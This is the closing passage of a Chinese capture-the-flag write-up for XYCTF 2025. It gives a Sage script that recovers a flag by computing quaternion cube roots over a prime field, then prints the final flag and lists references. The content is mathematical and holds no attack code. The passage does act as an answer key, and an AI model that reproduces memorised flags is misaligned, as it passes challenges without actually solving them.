mm3 <span class="keyword">in</span> m3:</span><br><span class="line">    m = get_root3(p, mm3)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(m) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> mm <span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(mm)</span><br><span class="line">        flag = <span class="string">b&#x27;&#x27;</span>.join(long_to_bytes(<span class="built_in">int</span>(component)) <span class="keyword">for</span> component <span class="keyword">in</span> mm)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># getroot3.py</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_root3</span>(<span class="params">p, Q</span>):</span><br><span class="line">    F = GF(p)  <span class="comment"># 定义有限域GF(p)</span></span><br><span class="line">    Q = (F(Q[<span class="number">0</span>]), F(Q[<span class="number">1</span>]), F(Q[<span class="number">2</span>]), F(Q[<span class="number">3</span>]))  <span class="comment"># 将四元数转换为GF(p)中的元素</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">quaternion_mult</span>(<span class="params">q1, q2</span>):</span><br><span class="line">        a1, b1, c1, d1 = q1</span><br><span class="line">        a2, b2, c2, d2 = q2</span><br><span class="line">        scalar = a1*a2 - b1*b2 - c1*c2 - d1*d2</span><br><span class="line">        i = a1*b2 + b1*a2 + c1*d2 - d1*c2</span><br><span class="line">        j = a1*c2 - b1*d2 + c1*a2 + d1*b2</span><br><span class="line">        k = a1*d2 + b1*c2 - c1*b2 + d1*a2</span><br><span class="line">        <span class="keyword">return</span> (scalar, i, j, k)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">quaternion_pow</span>(<span class="params">q, n</span>):</span><br><span class="line">        result = (F(<span class="number">1</span>), F(<span class="number">0</span>), F(<span class="number">0</span>), F(<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">                result = quaternion_mult(result, q)</span><br><span class="line">            q = quaternion_mult(q, q)</span><br><span class="line">            n = n // <span class="number">2</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取目标四元数的标量部分和向量部分</span></span><br><span class="line">    W, X, Y, Z = Q</span><br><span class="line">    S = W</span><br><span class="line">    V = (X, Y, Z)</span><br><span class="line">    N_V = (X**<span class="number">2</span> + Y**<span class="number">2</span> + Z**<span class="number">2</span>)  <span class="comment"># 向量部分的范数</span></span><br><span class="line">    N_Q = (W**<span class="number">2</span> + N_V)        <span class="comment"># 目标四元数的总范数</span></span><br><span class="line"></span><br><span class="line">    solutions = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 1: 检查 N_Q 是否为三次剩余</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cube_roots_NQ = N_Q.nth_root(<span class="number">3</span>, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        cube_roots_NQ = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> cube_roots_NQ:</span><br><span class="line">        <span class="comment"># Step 2: 解三次方程 4*N_V*k**3 -3*n*k +1 = 0</span></span><br><span class="line">        <span class="keyword">if</span> N_V == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># 处理纯标量情况</span></span><br><span class="line">            <span class="keyword">if</span> X == <span class="number">0</span> <span class="keyword">and</span> Y == <span class="number">0</span> <span class="keyword">and</span> Z == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    s_roots = S.nth_root(<span class="number">3</span>, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">                    solutions.extend( (s, F(<span class="number">0</span>), F(<span class="number">0</span>), F(<span class="number">0</span>)) <span class="keyword">for</span> s <span class="keyword">in</span> s_roots )</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># R.&lt;k&gt; = PolynomialRing(F)</span></span><br><span class="line">        R = PolynomialRing(F, <span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">        k = R.gen()</span><br><span class="line">        eq = <span class="number">4</span>*N_V * k**<span class="number">3</span> - <span class="number">3</span>*n * k + <span class="number">1</span></span><br><span class="line">        k_candidates = eq.roots(multiplicities=<span class="literal">False</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> k_candidates:</span><br><span class="line">            <span class="comment"># Step 3: 计算 s² = n - k²*N_V</span></span><br><span class="line">            s_sq = n - k**<span class="number">2</span> * N_V</span><br><span class="line">            <span class="keyword">if</span> s_sq == <span class="number">0</span>:</span><br><span class="line">                s_candidates = [F(<span class="number">0</span>)]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> s_sq.is_square():</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                s_candidates = s_sq.sqrt(<span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> s <span class="keyword">in</span> s_candidates:</span><br><span class="line">                <span class="comment"># Step 4: 验证标量方程 s*(n -4k²*N_V) ≡ S mod p</span></span><br><span class="line">                lhs = s * (n - <span class="number">4</span>*k**<span class="number">2</span>*N_V)</span><br><span class="line">                <span class="keyword">if</span> lhs == S:</span><br><span class="line">                    q = (s, k*X, k*Y, k*Z)</span><br><span class="line">                    <span class="comment"># 验证 q**3 是否等于 Q（避免计算误差）</span></span><br><span class="line">                    <span class="keyword">if</span> quaternion_pow(q, <span class="number">3</span>) == Q:</span><br><span class="line">                        solutions.append(q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 去重并输出</span></span><br><span class="line">    solutions = <span class="built_in">list</span>(<span class="built_in">set</span>(solutions))</span><br><span class="line">    <span class="comment"># print(f&quot;解为：&#123;solutions&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">return</span> solutions</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    p = <span class="number">63173373914948586508761871207488662566773264479285518327131522282352053209317</span></span><br><span class="line">    Q = (<span class="number">36698564177888078258192095739455152652959860052111216061091759447957860686074</span>, <span class="number">17870807869940687395361314550407377371850625515573380948432760072344080142389</span>, <span class="number">28335490245070169116781105091378482201161610915164600915589821149813685522901</span>, <span class="number">11951863920094324549214074577482301476865489472163720590246328864154628320061</span>)</span><br><span class="line">    get_root3(p, Q)</span><br></pre></td></tr></table></figure>

<p>最终得到 flag：<code>flag&#123;Quaternion_15_ComComComComplexXXX!!!?&#125;</code></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.ek1ng.com/SEKAICTF2022.html">https://www.ek1ng.com/SEKAICTF2022.html</a><br><a target="_blank" rel="noopener" href="https://ucasers.cn/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://ucasers.cn/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/xuxingzhuang/article/details/117108502">https://blog.csdn.net/xuxingzhuang/article/details/117108502</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/426189.html">https://www.freebuf.com/articles/web/426189.html</a></p>
</div><div class="article-licensing box"><div class="licensing-title"><p>2025 XYCTF</p><p><a href="https://blog.weyung.cc/2025/04/04/2025 XYCTF/">https://blog.weyung.cc/2025/04/04/2025 XYCTF/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>未央</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2025-04-04</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2025-07-31</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="CC BY-NC 4.0" href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh"><i class="icon fab fa-creative-commons"></i><i class="icon fab fa-creative-commons-by"></i><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/CTF/">CTF</a><a class="link-muted mr-2" rel="tag" href="/tags/Web/">Web</a></div><!--!--></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/images/wechatpay.png" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2025/04/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%E7%AC%94%E8%AE%B0%20-%201/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">春秋云境笔记 - 1</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2025/04/03/Docker%20%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%B5%85%E6%9E%90/"><span class="level-item">Docker 安全问题浅析</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div class="content" id="valine-thread"></div><script src="//cdn.jsdelivr.net/npm/leancloud-storage@3/dist/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@1.4.16/dist/Valine.min.js"></script><script>new Valine({
            el: '#valine-thread',
            appId: "naquiv8kljfmeFx6t9aSTTWn-9Nh9j0Va",
            appKey: "fneElOQzdSRFC3p43Bd4J69D",
            placeholder: "说点什么吧",
            avatar: "mm",
            avatarForce: false,
            meta: ["nick","mail","link"],
            pageSize: 10,
            lang: "zh-CN",
            visitor: false,
            highlight: true,
            recordIP: true,
            
            
            
            enableQQ: false,
            requiredFields: [],
        });</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/images/wy.png" alt="未央"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">未央</p><p class="is-size-6 is-block">写一些和我一样菜也能看懂的文章</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">58</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">9</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">43</p></a></div></div></nav><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="GitHub" href="https://github.com/weyung"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Telegram" href="https://t.me/we_yung"><i class="fab fa-telegram"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#碎碎念"><span class="level-left"><span class="level-item">1</span><span class="level-item">碎碎念</span></span></a></li><li><a class="level is-mobile" href="#Web"><span class="level-left"><span class="level-item">2</span><span class="level-item">Web</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Signin"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">Signin</span></span></a></li><li><a class="level is-mobile" href="#ezsql-手动滑稽"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">ezsql(手动滑稽)</span></span></a></li><li><a class="level is-mobile" href="#puzzle"><span class="level-left"><span class="level-item">2.3</span><span class="level-item">puzzle</span></span></a></li></ul></li><li><a class="level is-mobile" href="#Crypto"><span class="level-left"><span class="level-item">3</span><span class="level-item">Crypto</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#勒索病毒"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">勒索病毒</span></span></a></li><li><a class="level is-mobile" href="#Division"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">Division</span></span></a></li><li><a class="level is-mobile" href="#reed"><span class="level-left"><span class="level-item">3.3</span><span class="level-item">reed</span></span></a></li><li><a class="level is-mobile" href="#Complex-signin"><span class="level-left"><span class="level-item">3.4</span><span class="level-item">Complex_signin</span></span></a></li><li><a class="level is-mobile" href="#prng-xxxx"><span class="level-left"><span class="level-item">3.5</span><span class="level-item">prng_xxxx</span></span></a></li><li><a class="level is-mobile" href="#choice"><span class="level-left"><span class="level-item">3.6</span><span class="level-item">choice</span></span></a></li><li><a class="level is-mobile" href="#复复复复数"><span class="level-left"><span class="level-item">3.7</span><span class="level-item">复复复复数</span></span></a></li></ul></li><li><a class="level is-mobile" href="#参考"><span class="level-left"><span class="level-item">4</span><span class="level-item">参考</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-07-31T07:18:00.000Z">2025-07-31</time></p><p class="title"><a href="/2025/07/31/test/CodeQL%20%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%93%AA%E9%87%8C%E6%88%91%E4%B9%9F%E4%B8%8D%E7%9F%A5%E9%81%93%E5%95%8A%E5%95%8A%E5%95%8A/">CodeQL 从入门到哪里我也不知道啊啊啊</a></p><p class="categories"><a href="/categories/%E5%AD%A6%E4%B9%A0/">学习</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-04-14T14:50:00.000Z">2025-04-14</time></p><p class="title"><a href="/2025/04/14/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%20CVE-2016-5195/">漏洞分析之 CVE-2016-5195</a></p><p class="categories"><a href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-04-11T06:36:00.000Z">2025-04-11</time></p><p class="title"><a href="/2025/04/11/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%20CVE-2021-44228/">漏洞分析之 CVE-2021-44228</a></p><p class="categories"><a href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-04-09T12:01:00.000Z">2025-04-09</time></p><p class="title"><a href="/2025/04/09/Java%20%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/">Java 基础概念</a></p><p class="categories"><a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">环境搭建</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-04-09T07:57:00.000Z">2025-04-09</time></p><p class="title"><a href="/2025/04/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%E7%AC%94%E8%AE%B0%20-%201/">春秋云境笔记 - 1</a></p><p class="categories"><a href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></p></div></article></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/C%E8%AF%AD%E8%A8%80/"><span class="level-start"><span class="level-item">C语言</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AD%A6%E4%B9%A0/"><span class="level-start"><span class="level-item">学习</span></span><span class="level-end"><span class="level-item tag">21</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%B0%8F%E7%8E%A9%E6%84%8F/"><span class="level-start"><span class="level-item">小玩意</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%B0%8F%E9%A1%B9%E7%9B%AE/"><span class="level-start"><span class="level-item">小项目</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%95%B0%E5%AD%A6/"><span class="level-start"><span class="level-item">数学</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%B8%97%E9%80%8F/"><span class="level-start"><span class="level-item">渗透</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"><span class="level-start"><span class="level-item">环境搭建</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%94%9F%E6%B4%BB/"><span class="level-start"><span class="level-item">生活</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/%E9%A2%98%E8%A7%A3/"><span class="level-start"><span class="level-item">题解</span></span><span class="level-end"><span class="level-item tag">15</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/C/"><span class="tag">C</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">18</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CVP/"><span class="tag">CVP</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Code-server/"><span class="tag">Code-server</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Crypto/"><span class="tag">Crypto</span><span class="tag">14</span></a></div><div class="control"><a class="tags has-addons" href="/tags/GPT/"><span class="tag">GPT</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Golang/"><span class="tag">Golang</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Java/"><span class="tag">Java</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux/"><span class="tag">Linux</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Nginx/"><span class="tag">Nginx</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP/"><span class="tag">PHP</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Python/"><span class="tag">Python</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SSL/"><span class="tag">SSL</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/VSCode/"><span class="tag">VSCode</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/WSL/"><span class="tag">WSL</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Web/"><span class="tag">Web</span><span class="tag">11</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Windows/"><span class="tag">Windows</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwn/"><span class="tag">pwn</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web/"><span class="tag">web</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"><span class="tag">二进制安全</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BB%A3%E7%90%86/"><span class="tag">代理</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BF%A1%E5%8F%B7%E4%B8%8E%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/"><span class="tag">信号与系统笔记</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BF%A1%E6%81%AF%E8%AE%BA/"><span class="tag">信息论</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%89%8D%E7%AB%AF/"><span class="tag">前端</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%A4%8D%E5%8F%98%E5%87%BD%E6%95%B0/"><span class="tag">复变函数</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%AD%A6%E4%B9%A0/"><span class="tag">学习</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/"><span class="tag">抽象代数</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%95%B0%E5%AD%A6/"><span class="tag">数学</span><span class="tag">10</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%9D%82%E8%B0%88/"><span class="tag">杂谈</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%9D%90%E6%96%99%E5%8A%9B%E5%AD%A6/"><span class="tag">材料力学</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%A0%BC/"><span class="tag">格</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%B1%87%E7%BC%96/"><span class="tag">汇编</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%B8%97%E9%80%8F/"><span class="tag">渗透</span><span class="tag">9</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%94%9F%E6%B4%BB/"><span class="tag">生活</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%94%B5%E5%BD%B1/"><span class="tag">电影</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%AE%97%E6%B3%95/"><span class="tag">算法</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"><span class="tag">计算机</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"><span class="tag">计算机网络</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%BB%84/"><span class="tag">计组</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%BA%E6%96%87/"><span class="tag">论文</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"><span class="tag">静态分析</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%9D%A2%E8%AF%95/"><span class="tag">面试</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%AB%98%E6%95%B0/"><span class="tag">高数</span><span class="tag">3</span></a></div></div></div></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2025/07/"><span class="level-start"><span class="level-item">七月 2025</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2025/04/"><span class="level-start"><span class="level-item">四月 2025</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2025/03/"><span class="level-start"><span class="level-item">三月 2025</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/12/"><span class="level-start"><span class="level-item">十二月 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/11/"><span class="level-start"><span class="level-item">十一月 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/06/"><span class="level-start"><span class="level-item">六月 2024</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/05/"><span class="level-start"><span class="level-item">五月 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/11/"><span class="level-start"><span class="level-item">十一月 2023</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/09/"><span class="level-start"><span class="level-item">九月 2023</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/05/"><span class="level-start"><span class="level-item">五月 2023</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/04/"><span class="level-start"><span class="level-item">四月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/01/"><span class="level-start"><span class="level-item">一月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/10/"><span class="level-start"><span class="level-item">十月 2022</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/09/"><span class="level-start"><span class="level-item">九月 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/08/"><span class="level-start"><span class="level-item">八月 2022</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/07/"><span class="level-start"><span class="level-item">七月 2022</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/05/"><span class="level-start"><span class="level-item">五月 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/04/"><span class="level-start"><span class="level-item">四月 2022</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/03/"><span class="level-start"><span class="level-item">三月 2022</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/12/"><span class="level-start"><span class="level-item">十二月 2021</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/11/"><span class="level-start"><span class="level-item">十一月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/images/wy.png" alt="weyung" height="28"></a><p class="is-size-7"><span>&copy; 2025 未央</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="CC BY-NC 4.0" 